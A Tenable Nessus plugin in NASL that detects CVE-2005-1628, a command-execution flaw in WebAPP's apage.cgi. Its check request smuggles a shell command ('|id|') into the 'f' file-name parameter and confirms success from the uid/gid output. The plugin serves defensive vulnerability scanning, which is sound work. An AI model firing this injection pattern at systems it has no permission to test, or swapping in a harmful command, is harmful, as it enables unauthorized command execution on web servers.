#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(18292);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2005-1628");
 script_bugtraq_id(13637);
 script_osvdb_id(16748);

 script_name(english:"WebAPP apage.cgi f Parameter Arbitrary Command Execution");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows for execution
of arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"Due to a lack of user input validation, an attacker can exploit the
'apage.cgi' script in the version of WebAPP on the remote host to
execute arbitrary commands on the remote host with the privileges of
the web server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WebAPP version 0.9.9.2 or newer." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/22");
 script_cvs_date("$Date: 2011/11/28 21:39:47 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for apage.cgi remote command execution flaw");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencies("webapp_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/webapp"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 dir = matches[2];

 http_check_remote_code (
			unique_dir:dir,
			check_request:"/mods/apage/apage.cgi?f=file.htm.|id|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
}
